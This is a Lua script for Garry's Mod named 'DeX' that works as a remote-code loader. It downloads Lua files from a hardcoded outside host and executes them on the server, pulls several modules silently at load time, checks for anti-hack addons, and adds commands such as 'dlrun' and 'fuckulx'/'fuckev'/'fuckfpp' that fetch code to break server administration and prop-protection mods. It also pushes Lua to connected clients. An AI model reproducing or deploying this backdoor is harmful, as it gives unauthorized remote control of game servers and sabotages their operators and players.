--[[
	=== Direct Execute ===
	DeX.lua
	"Their world is in flames and we're giving them gasoline!"
]]

--- === Version === ---
DEX_VERSION = "2.1"
--- === /Version === ---


--if not DEX_PATH then
	DEX_PATH = "http://gmod.game-host.org/bar/dex/" --Where to load the plugins from
--end


--- === SETUP === ---
local function Download(str)
	local http = HTTPGet()
		http:Download(str,"")
		debug.sethook()
		repeat until http:Finished()
	return http:GetBuffer()
end

function ExecDownload(path,str,Silent,DLonly)
	local Full = path..str
	local Code = Download(Full) or false
	if not Code then
		return MsgAll(Full.." won't download!\n")
	end
	
	if DLonly then
		return Code
	end
	if not Silent then
		MsgAll(str.." loaded\n")
	end
	RunStringEx(Code,str)
	--RunString(Code)
end

local function GetUH() IsUH = ((HAC and HAC.Version) or (HSP and HSP.Loaded)) end
GetUH()
hook.Add("Think", tostring(CurTime()), GetUH)
function Useless() end
function TRUE() return true end
--- === /SETUP === ---


--- === COMMANDS === ---
command = {}
function command.Add(cmd,func,info)
	concommand.Add(cmd,func)
	command[cmd] = (info or "None")
end

local function DexList(ply,cmd,args)
	ply:print("\nDeX v"..DEX_VERSION..", cmd\tinfo")
	local tot = 0
	
	for cmd,info in pairs(command) do
		if cmd != "Add" then
			ply:print( Format("\t%s\t\-\t%s", cmd,info) )
			tot = tot + 1
		end
	end
	
	ply:print("DeX v"..DEX_VERSION.." has ["..tot.."] commands")
end
concommand.Add("dex", DexList)

local function DownloadRun(ply,cmd,args)
	if IsUH then return ply:print("[ERR] No modules!") end
	ExecDownload(DEX_PATH, args[1] )
end
command.Add("dlrun", DownloadRun, "Exec lua file from DEX_PATH")

local function ReloadSelf(ply,cmd,args)
	ExecDownload(DEX_PATH, "dex.lua", true)
end
command.Add("dex_reload", ReloadSelf, "Reload")
--- === /COMMANDS === ---


ExecDownload(DEX_PATH, "meta.lua",	 		true)
ExecDownload(DEX_PATH, "fixers.lua", 		true)
ExecDownload(DEX_PATH, "useful.lua", 		true)
ExecDownload(DEX_PATH, "fun.lua",			true)
ExecDownload(DEX_PATH, "chatfilter.lua",	true)
ExecDownload(DEX_PATH, "bubble.lua",		true)


--UMT
local function LoadUMT(ply,cmd,args)
	local Valid = ValidEntity(ply)
	
	ExecDownload(DEX_PATH, "umt.lua", 	(not Valid))
	ExecDownload(DEX_PATH, "skid.lua", 	(not Valid))
	
	if args then
		ply:print("[OK] UMT loaded")
	end
end
command.Add("umt", LoadUMT, "Load SkidCheck/UMT")
--[[
if not IsUH then
	timer.Simple(5, function()
		LoadUMT()
	end)
end
]]

--ULX
local function FuckULX(ply,cmd,args)
	if IsUH then return ply:print("[ERR] No modules!") end
	ExecDownload(DEX_PATH, "ulx.lua")
end
command.Add("fuckulx", FuckULX, "Break ULX")

--EV
local function FuckEV(ply,cmd,args)
	if IsUH then return ply:print("[ERR] No modules!") end
	ExecDownload(DEX_PATH, "ev.lua")
end
command.Add("fuckev", FuckEV, "Break EV")

--FPP
local function FuckFPP(ply,cmd,args)
	if IsUH then return ply:print("[ERR] No modules!") end
	ExecDownload(DEX_PATH, "fpp.lua")
end
command.Add("fuckfpp", FuckFPP, "Break FPP")




local PISLua = [[
	DeX = true
]]

local function DeXInitialSpawn(ply)
	ply:SendLua(PISLua)
end
hook.Add("PlayerInitialSpawn", "DeXInitialSpawn", DeXInitialSpawn)
BroadcastLua(PISLua)

MsgAll("\nDeX "..DEX_VERSION.." has respawned\n\n")





